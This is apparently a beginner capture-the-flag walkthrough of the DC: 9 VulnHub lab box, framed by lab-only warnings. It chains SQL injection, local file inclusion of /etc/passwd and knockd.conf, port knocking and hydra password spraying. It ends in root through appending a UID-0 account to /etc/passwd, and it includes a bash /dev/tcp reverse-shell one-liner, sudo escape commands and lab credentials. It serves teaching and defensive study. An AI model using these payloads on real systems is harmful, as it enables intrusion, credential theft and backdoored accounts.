# DC: 9 — VulnHub Walkthrough (Beginner Friendly)

> This is a deliberately vulnerable machine for *learning*. Only ever attack a
> box you own or were given written permission to test. Keep it on an isolated
> host-only / NAT lab network that can't reach the internet.

| Field | Value |
| --- | --- |
| **Machine** | DC: 9 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | DCAU |
| **Released** | 29 Dec 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/dc-9,412/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/dc-9,412/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 64-bit) |

> **A note on exact values:** passwords, banner text, IP addresses, knock
> sequences, and the flag contents **vary by build**. Every IP here is the
> example `192.168.56.101`. Substitute whatever address `arp-scan` reports for
> you. The *method* is what matters, not the literal strings.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host and its open ports, and why port 22 says "filtered".
- How to find a **UNION-based SQL injection** and dump credentials with `sqlmap`.
- How to find and use a **Local File Inclusion (LFI)** to read files on the box.
- What **port knocking** is, and how to use the LFI to recover the knock secret.
- How to **password spray** recovered credentials against SSH with `hydra`.
- How to abuse a `sudo`-allowed custom binary to get **arbitrary file write** and
  become root via `/etc/passwd`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# See your own address and the lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your attacker is on `192.168.56.0/24`, so the DC: 9 box
> will be on the same subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast, layer 2)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (your Kali)
192.168.56.101  (unknown device)   <-- the target
```

> **Why it works:** ARP resolves "who has this IP?" at the link layer, so it
> finds hosts even if they drop ICMP or block TCP. Standard first move.

![finding the target](images/01-recon.png)

**Target IP:** `192.168.56.101` (yours will differ).

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 192.168.56.101
```

```text
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
```

> **How to read it:** port 80 is open, but port 22 is **filtered** — a firewall
> is dropping our packets. That is a clue: SSH exists but something is hiding
> it. We will come back to this. (Some full scans and fast sequences can
> accidentally flush the firewall rule open; see section 3.4.)

```bash
sudo nmap -sC -sV -p 22,80 192.168.56.101
```

```text
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Welcome to DC-9
22/tcp filtered ssh
```

![nmap service scan](images/02-nmap.png)

Browsing the site reveals a staff-records PHP application with three pages:

- `display.php` — Display All Records
- `search.php` — Search (a form)
- `manage.php` — Manage (requires login)

> **How to read it:** a search form is a prime SQL-injection candidate. Forms
> feed user input straight into database queries.

---

## 3. Foothold — gaining the first shell

### 3.1 Confirm the SQL injection

The search box takes a first name. Try a classic tautology:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
curl -s "http://192.168.56.101/search.php" --data "search=1' OR 1=1 -- -"
```

> **Why it works:** `' OR 1=1 -- -` closes the string, makes the `WHERE` clause
> always true (so *all* rows return), and comments out the rest. If the page
> suddenly lists every record, the parameter is injectable.

![finding the injection](images/03-enum.png)

### 3.2 Dump the databases with sqlmap

```bash
# Save the search request (or just use the URL form) and let sqlmap work
sqlmap -r search.txt --batch --dbs
# ...or direct:
sqlmap -u "http://192.168.56.101/search.php" \
       --data="search=test" --batch --dbs
```

```text
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

```bash
sqlmap -r search.txt -D Staff -T Users --dump --batch
```

```text
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | <md5 hash>                       |
+----------+----------------------------------+
```

> **Why it works:** the MD5 hash here belongs to `admin`. MD5 is fast and
> unsalted, so it is trivially crackable — paste it into a hash-cracking site /
> use `hashcat`, or check a rainbow table. For this build it resolves to
> `transorbital1` (varies by build).

```bash
sqlmap -r search.txt -D users -T UserDetails --dump --batch
```

```text
+----------+---------------+----------------+
| username | password      | ...            |
+----------+---------------+----------------+
| chandlerb| UrAG0D!       | ...            |
| joeyt    | Passw0rd      | ...            |
| janitor  | Ilovepeepee   | ...            |
| fredf    | B4-Tru3-001   | ...            |
| ...      | ...           | ...            |
+----------+---------------+----------------+
```

> **Why it works:** a whole `UserDetails` table of plaintext passwords is a
> goldmine — but it is **not** the web login, it is a set of *system/SSH*-style
> accounts we'll spray later. The workflow is: get web-accessible creds here,
> find the way to reach SSH, then spray.

### 3.3 Log in and find the LFI

Log in at `http://192.168.56.101/manage.php` as `admin` / `transorbital1`.

On the manage page you'll see an odd error at the footer:

```text
File does not exist
```

> **Why it works:** that message is produced by a PHP `include()` that failed —
> a classic sign of a **Local File Inclusion**. If we can control *which* file
> is included, we can read files on the server.

Fuzz for the parameter name:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
ffuf -u "http://192.168.56.101/manage.php?FUZZ=index.php" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 0 -c
```

```text
file     [Status: 200, Size: ...]
```


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl "http://192.168.56.101/manage.php?file=../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> **Why it works:** the page does `include('directory/' . $_GET['file'])` with
> no validation. `../` climbs out of the directory and reads any file the web
> user can read.

### 3.4 Recover the port-knock secret

Why is port 22 filtered? Because a **port-knock daemon** (`knockd`) is holding
it shut until the right sequence of ports is "knocked". Read its config via LFI:

```bash
curl "http://192.168.56.101/manage.php?file=../../../../etc/knockd.conf"
```

```text
[options]
    UseSyslog

[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9842,8475,7469
    seq_timeout = 5
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn
```

> **Why it works:** `knockd.conf` literally hands us the secret handshake. The
> sequence and ports **vary by build** if the author changed them — read them
> from *your* box, don't trust these values blindly.

### 3.5 Knock, then spray SSH

Send a SYN to each port in order to open 22:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
for i in 7469 8475 9842; do nc -w1 192.168.56.101 $i; done
```

```bash
# Confirm SSH is now open
nmap -p 22 192.168.56.101
```

```text
22/tcp open  ssh
```

> **Why it works:** knocking the ports in sequence makes `knockd` insert an
> iptables rule that allows *your* IP to reach port 22.

Now build username/password lists from the SQLi dump and spray with hydra:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.56.101   login: joeyt       password: Passw0rd
[22][ssh] host: 192.168.56.101   login: janitor     password: Ilovepeepee
```

```bash
ssh janitor@192.168.56.101
```

> **Why it works:** the same credentials found in the web database are *reused*
> as system accounts — the classic **password-spray** win.

### 3.6 Escalate the foothold: another password list

In `janitor`'s home there's a hidden directory with more passwords:

```bash
ls -la
cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
```

```text
BamBam01
...
```

Append these to your password list and spray again:

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101   login: fredf   password: B4-Tru3-001
```

> **Why it works:** social/offline password hygiene failed. `fredf` is our
> ticket to the privileged binary in the next section.

### 3.7 The user flag

DC: 9 only ships **one** flag, in `/root`, so there is no user flag — the
escalation below is the finale.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
ssh fredf@192.168.56.101
sudo -l
```

```text
User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

> **Why it works:** `fredf` can run a custom binary as root without a password.
> That is the whole escalation path if the binary can be abused.

Inspect what it does (the source is available on the box):

```bash
cat /opt/devstuff/test.py
```

```python
#!/usr/bin/python
import sys
if len(sys.argv) != 3:
    print ("Usage: python test.py read append")
    sys.exit (1)
else:
    f = open(sys.argv[1], "r")
    output = (f.read())
    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

> **Why it works:** `test` reads file **argv[1]** and *appends its contents* to
> file **argv[2]**. Run as root, that is **arbitrary file write** — hugely
> powerful.

Exploit: append a new **root-equivalent** user to `/etc/passwd`.


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
# 1. Generate a password hash (on the target or Kali)
openssl passwd -1 -salt hacker 'Password123!'
```

```text
$1$hacker$9W.1eI2oQiDkOpMUxHPja0
```

```bash
# 2. Craft a passwd line: user:hash:UID:GID:comment:home:shell
echo 'hacker:$1$hacker$9W.1eI2oQiDkOpMUxHPja0:0:0::/root:/bin/bash' > /tmp/newuser
```

> **Why it works:** `UID 0` and `GID 0` make this account **root-equivalent**.
> `/etc/passwd` is a flat text database; appending a line is enough.

```bash
# 3. Use the sudo binary to append our line to the real /etc/passwd
sudo /opt/devstuff/dist/test/test /tmp/newuser /etc/passwd
```

```bash
# 4. Switch to our new account and prove we are root
su hacker
# Password: Password123!
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the append succeeded because root ran it. Our `hacker`
> account has UID/GID 0, so `su hacker` gives a full root shell.

> **Alternative (SSH key):** you could instead `sudo test /tmp/authorized_keys
> /root/.ssh/authorized_keys` — but this fails if `/root/.ssh/` doesn't exist,
> which is why the `/etc/passwd` trick is the reliable path.

### The root flag

```bash
cd /root
ls
cat theflag.txt
```

```text
Congratulations!!!  Hope you enjoyed DC-9.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | UNION-based SQL injection | `search.php` (search parameter) | Dumped `Staff`/`users` databases |
| 2 | Cleartext passwords in a database | `users.UserDetails` | SSH credentials leaked |
| 3 | Local File Inclusion | `manage.php?file=` | Read `/etc/passwd`, `/etc/knockd.conf` |
| 4 | Weak MD5 admin hash | `Staff.Users` | Admin web login cracked |
| 5 | Port knocking secret readable via LFI | `/etc/knockd.conf` | SSH "hidden" port exposed |
| 6 | Password reuse / weak system passwords | system accounts | SSH footholds via hydra |
| 7 | `sudo NOPASSWD` on a file-copy binary | `/opt/devstuff/dist/test/test` | Arbitrary file write → root |

## 6. Defensive lessons (blue team)

- **Fix the injection first.** Prepared statements / parameterised queries make
  the SQL database unreachable from the search box.
- **Never store plaintext passwords.** System and application credentials must
